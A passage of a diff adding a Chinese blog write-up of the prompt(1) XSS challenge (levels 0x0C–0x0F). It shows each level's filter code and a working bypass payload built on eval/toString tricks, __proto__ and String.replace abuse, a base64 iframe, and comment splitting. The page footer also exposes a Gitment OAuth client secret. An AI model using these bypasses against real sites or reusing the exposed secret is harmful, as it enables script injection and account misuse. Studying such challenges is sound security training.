class="line">&#125;</div></pre></td></tr></table></figure>
+<p>有一个知识点,在脚本环境中，<code>&quot;string&quot;(alert(1))</code> 不会报错，且会正确执行，而为了使语法正确，使用<code>in</code>关键字，结果如下:</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">"(prompt(1))in"</span></div></pre></td></tr></table></figure>
+<h3 id="0x0C"><a href="#0x0C" class="headerlink" title="0x0C"></a>0x0C</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</div><div class="line">    <span class="comment">// in Soviet Russia...</span></div><div class="line">    input = <span class="built_in">encodeURIComponent</span>(input).replace(<span class="regexp">/'/g</span>, <span class="string">''</span>);</div><div class="line">    <span class="comment">// table flips you!</span></div><div class="line">    input = input.replace(<span class="regexp">/prompt/g</span>, <span class="string">'alert'</span>);</div><div class="line"></div><div class="line">    <span class="comment">// ノ┬─┬ノ ︵ ( \o°o)\</span></div><div class="line">    <span class="keyword">return</span> <span class="string">'&lt;script&gt;'</span> + input + <span class="string">'&lt;/script&gt; '</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>对于<code>encodeURIComponent</code>，其不会编码 <code>.()</code> 可以通过 <code>toString()</code> 构造payload  </p>
+<p><code>toString(radix)</code>中<code>radix</code> 为 2-36 可以选36使其作为一个进制，将字符包含起来<br>使用<code>parseInt(str, radix)</code> 将字符转为数字之后使用<code>(number).toString(radix)</code> 然后用eval进行调用 注意number有括号，<code>(number).toString(radix)</code>  可简写为 <code>（numbrer..toString(radix)</code> ，字符之间用<code>concat()</code>连接  </p>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">eval(<span class="number">630038579</span>..toString(<span class="number">30</span>))(<span class="number">1</span>)==eval(<span class="name">prompt</span>(<span class="number">1</span>))</div></pre></td></tr></table></figure>
+<h3 id="0x0D"><a href="#0x0D" class="headerlink" title="0x0D"></a>0x0D</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"> <span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</div><div class="line">    <span class="comment">// extend method from Underscore library</span></div><div class="line">    <span class="comment">// _.extend(destination, *sources) </span></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">extend</span>(<span class="params">obj</span>) </span>&#123;</div><div class="line">        <span class="keyword">var</span> source, prop;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>, length = <span class="built_in">arguments</span>.length; i &lt; length; i++) &#123;</div><div class="line">            source = <span class="built_in">arguments</span>[i];</div><div class="line">            <span class="keyword">for</span> (prop <span class="keyword">in</span> source) &#123;</div><div class="line">                obj[prop] = source[prop];</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> obj;</div><div class="line">    &#125;</div><div class="line">    <span class="comment">// a simple picture plugin</span></div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        <span class="comment">// pass in something like &#123;"source":"http://sandbox.prompt.ml/PROMPT.JPG"&#125;</span></div><div class="line">        <span class="keyword">var</span> data = <span class="built_in">JSON</span>.parse(input);</div><div class="line">        <span class="keyword">var</span> config = extend(&#123;</div><div class="line">            <span class="comment">// default image source</span></div><div class="line">            source: <span class="string">'http://placehold.it/350x150'</span></div><div class="line">        &#125;, <span class="built_in">JSON</span>.parse(input));</div><div class="line">        <span class="comment">// forbit invalid image source</span></div><div class="line">        <span class="keyword">if</span> (<span class="regexp">/[^\w:\/.]/</span>.test(config.source)) &#123;</div><div class="line">            <span class="keyword">delete</span> config.source;</div><div class="line">        &#125;</div><div class="line">        <span class="comment">// purify the source by stripping off "</span></div><div class="line">        <span class="keyword">var</span> source = config.source.replace(<span class="regexp">/"/g</span>, <span class="string">''</span>);</div><div class="line">        <span class="comment">// insert the content using mustache-ish template</span></div><div class="line">        <span class="keyword">return</span> <span class="string">'&lt;img src="&#123;&#123;source&#125;&#125;"&gt;'</span>.replace(<span class="string">'&#123;&#123;source&#125;&#125;'</span>, source);</div><div class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</div><div class="line">        <span class="keyword">return</span> <span class="string">'Invalid image data.'</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<blockquote>
+<figure class="highlight delphi"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&gt;<span class="keyword">In</span> fact, config.source <span class="keyword">is</span> equal <span class="keyword">to</span> config.__proto__.source, this because __proto__ <span class="keyword">is</span> an accessor <span class="keyword">property</span> (getter/setter <span class="function"><span class="keyword">function</span>)</span></div></pre></td></tr></table></figure>
+</blockquote>
+<p>这也是常见的构造相同名称的属性进行绕过替换。知道这一点，我们可以将结果构造成如下形式：</p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;<span class="string">"source"</span>:<span class="string">"_-_invalid-URL_-_"</span>,<span class="string">"__proto__"</span>:&#123;<span class="string">"source"</span>:<span class="string">"my_evil_payload"</span>&#125;&#125;`</div></pre></td></tr></table></figure>
+<p>他会理解为:</p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">config = &#123;</div><div class="line">    <span class="string">"source"</span>: <span class="string">"_-_invalid-URL_-_"</span>,</div><div class="line">    <span class="string">"__proto__"</span>: &#123;</div><div class="line">        <span class="string">"source"</span>: <span class="string">"my_evil_payload"</span></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>之后，我们的<code>payload</code>已经进入<code>source</code>字段中，但是如果我们无法注入<code>&quot;</code>，依旧无法跳出<code>&lt;img src=&quot;_posts/prompt-1-writeup.md&quot;&gt;</code>,这里需要一个奇技淫巧，<code>String.replace</code>,他有一些<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace#Description" target="_blank" rel="external">特殊的替换规则</a>：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">Pattern</th>
+<th style="text-align:left">Inserts</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center"><code>$$</code></td>
+<td style="text-align:left">Inserts a “$”.</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>$&amp;</code></td>
+<td style="text-align:left">Inserts the matched substring.</td>
+</tr>
+<tr>
+<td style="text-align:center">$`</td>
+<td style="text-align:left">Inserts the portion of the string that precedes the matched substring.</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>$&#39;</code></td>
+<td style="text-align:left">Inserts the portion of the string that follows the matched substring.</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>$n</code></td>
+<td style="text-align:left">Where n is a positive integer less than 100, inserts the nth parenthesized submatch string, provided the first argument was a RegExp object. Note that this is 1-indexed.</td>
+</tr>
+</tbody>
+</table>
+<p>所以,答案为:</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;<span class="attr">"source"</span>:&#123;&#125;,<span class="attr">"__proto__"</span>:&#123;<span class="attr">"source"</span>:<span class="string">"$`onerror=prompt(1)&gt;"</span>&#125;&#125;</div></pre></td></tr></table></figure>
+<h3 id="0x0E"><a href="#0x0E" class="headerlink" title="0x0E"></a>0x0E</h3><figure class="highlight stata"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">function escape(<span class="keyword">input</span>) &#123;</div><div class="line">    <span class="comment">// I expect this one will have other solutions, so be creative :)</span></div><div class="line">    <span class="comment">// mspaint makes all file names in all-caps :(</span></div><div class="line">    <span class="comment">// too lazy to convert them back in lower case</span></div><div class="line">    <span class="comment">// sample input: prompt.jpg =&gt; PROMPT.JPG</span></div><div class="line">    <span class="keyword">input</span> = <span class="keyword">input</span>.toUpperCase();</div><div class="line">    <span class="comment">// only allows images loaded from own host or data URI scheme</span></div><div class="line">    <span class="keyword">input</span> = <span class="keyword">input</span>.<span class="keyword">replace</span>(/\/\/|\w+:/<span class="keyword">g</span>, 'data:');</div><div class="line">    <span class="comment">// miscellaneous filtering</span></div><div class="line">    <span class="keyword">input</span> = <span class="keyword">input</span>.<span class="keyword">replace</span>(/[\\&amp;+%\s]|vbs/gi, '_');</div><div class="line"></div><div class="line">    <span class="keyword">return</span> '&lt;img src=<span class="string">"' + input + '"</span>&gt;';</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>这题chrome上好像不行，firefox上使用iframe，src使用<code>base64</code>编码可以达成绕过。</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">"&gt;&lt;IFRAME/SRC="</span>x:text/html;base<span class="number">64</span>,ICA<span class="number">8</span>U<span class="number">0</span><span class="symbol">NSSVBUIC8</span>KU<span class="number">1</span>JDCSA<span class="number">9</span>SFRUUF<span class="name">M6</span>UE<span class="number">1</span>UMS<span class="number">5</span><span class="symbol">NTD4</span>JPC<span class="number">9</span>TQ<span class="number">1</span>JJUFQJPD<span class="number">4</span>=</div></pre></td></tr></table></figure>
+<h3 id="0x0F"><a href="#0x0F" class="headerlink" title="0x0F"></a>0x0F</h3><figure class="highlight scilab"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(input)</span> &#123;</span></div><div class="line">    <span class="comment">// sort of spoiler of level 7</span></div><div class="line">    input = input.replace(/\*/g, <span class="string">''</span>);</div><div class="line">    <span class="comment">// pass in something like dog#cat#bird#mouse...</span></div><div class="line">    var segments = input.split(<span class="string">'#'</span>);</div><div class="line"></div><div class="line">    <span class="keyword">return</span> segments.map(<span class="function"><span class="keyword">function</span><span class="params">(title, index)</span> &#123;</span></div><div class="line">        <span class="comment">// title can only contain 15 characters</span></div><div class="line">        <span class="keyword">return</span> <span class="string">'&lt;p class="</span>comment<span class="string">" title="</span><span class="string">' + title.slice(0, 15) + '</span><span class="string">" data-comment=\'&#123;"</span>id<span class="string">":'</span> + index + <span class="string">'&#125;\'&gt;&lt;/p&gt;'</span>;</div><div class="line">    &#125;).join(<span class="string">'\n'</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>同之前的题，利用注释闭合，不同的是，这里使用<code>&lt;!----&gt;</code>,答案如下:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">"&gt;<span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="comment">&lt;!--#--&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml"><span class="comment">&lt;!--#--&gt;</span>prompt(1<span class="comment">&lt;!--#--&gt;</span>)</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    empty_xl
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://yoursite.com/blog/prompt-1-writeup/" title="prompt(1)-writeup">http://yoursite.com/blog/prompt-1-writeup/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" rel="external nofollow" target="_blank">CC BY-NC-ND 4.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/XSS/" rel="tag"><i class="fa fa-tag"></i> XSS</a>
+          
+            <a href="/tags/writeup/" rel="tag"><i class="fa fa-tag"></i> writeup</a>
+          
+            <a href="/tags/security/" rel="tag"><i class="fa fa-tag"></i> security</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/blog/hackinglab-writeup/" rel="next" title="HackingLab writeup">
+                <i class="fa fa-chevron-left"></i> HackingLab writeup
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/blog/alert-1-writeup/" rel="prev" title="alert(1)-writeup">
+                alert(1)-writeup <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+    <link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">
+    <script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
+    <script>
+    var gitment = new Gitment({
+      // 根据文章标题设置唯一评论id
+    // id: '', // optional
+    owner: 'emptyxl',
+    repo: 'emptyxl.github.io',
+    oauth: {
+      client_id: 'fa7413e3c0207a96ae03',
+      client_secret: 'a599fef18d25ba5c813d2e437260892e146462a2',
+      }
+    })
+    gitment.render('comments')
+    </script>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.png"
+               alt="empty_xl" />
+          <p class="site-author-name" itemprop="name">empty_xl</p>
+           
+              <p class="site-description motion-element" itemprop="description">hello world!</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives/">
+                <span class="site-state-item-count">51</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">35</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">77</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/emptyxl" target="_blank" title="Github">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                    
+                      Github
+                    
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="/mail/index.html" target="_blank" title="E-Mail">
+                  
+                    <i class="fa fa-fw fa-envelope"></i>
+                  
+                    
+                      E-Mail
+                    
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+          <div class="cc-license motion-element" itemprop="license">
+            <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" class="cc-opacity" target="_blank">
+              <img src="/images/cc-by-nc-nd.svg" alt="Creative Commons" />
+            </a>
+          </div>
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00"><span class="nav-number">1.</span> <span class="nav-text">0x00</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01"><span class="nav-number">2.</span> <span class="nav-text">0x01</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02"><span class="nav-number">3.</span> <span class="nav-text">0x02</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03"><span class="nav-number">4.</span> <span class="nav-text">0x03</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04"><span class="nav-number">5.</span> <span class="nav-text">0x04</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05"><span class="nav-number">6.</span> <span class="nav-text">0x05</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x06"><span class="nav-number">7.</span> <span class="nav-text">0x06</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x07"><span class="nav-number">8.</span> <span class="nav-text">0x07</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x08"><span class="nav-number">9.</span> <span class="nav-text">0x08</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x09"><span class="nav-number">10.</span> <span class="nav-text">0x09</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x0A"><span class="nav-number">11.</span> <span class="nav-text">0x0A</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x0B"><span class="nav-number">12.</span> <span class="nav-text">0x0B</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x0C"><span class="nav-number">13.</span> <span class="nav-text">0x0C</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x0D"><span class="nav-number">14.</span> <span class="nav-text">0x0D</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x0E"><span class="nav-number">15.</span> <span class="nav-text">0x0E</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x0F"><span class="nav-number">16.</span> <span class="nav-text">0x0F</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    
+    &emsp;&emsp;|&emsp;
+  </span>
+  <span class="author" itemprop="copyrightHolder">empty_xl</span>
+</div>
+
+
+<div class="powered-by">
+  
+  Power &mdash; Hexo
+</div>
+
+<div class="theme-info">
+  
+  Theme &mdash; NexT.Mist
+</div>
+<div>
+<p>Hosted by <a href="https://pages.coding.me" style="font-weight: bold">Coding Pages</a></p>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
